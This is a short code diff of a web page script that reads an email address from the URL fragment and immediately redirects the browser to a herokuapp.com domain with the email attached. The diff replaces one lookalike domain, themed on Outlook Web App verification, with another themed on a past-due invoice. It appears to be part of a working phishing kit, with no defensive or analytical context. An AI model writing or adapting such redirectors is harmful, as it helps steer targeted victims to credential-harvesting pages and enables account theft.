@@ -10,7 +10,7 @@
         var em = hash.split('#')[1];
                                         
                        window.setTimeout(function() {
-    window.location.href = 'https://owa-appveri2022usesamecontinue.herokuapp.com/#'+em;
+    window.location.href = 'https://mpginv-invveri2021spastdueme.herokuapp.com/#'+em;
 }, 0);
         
     </script>
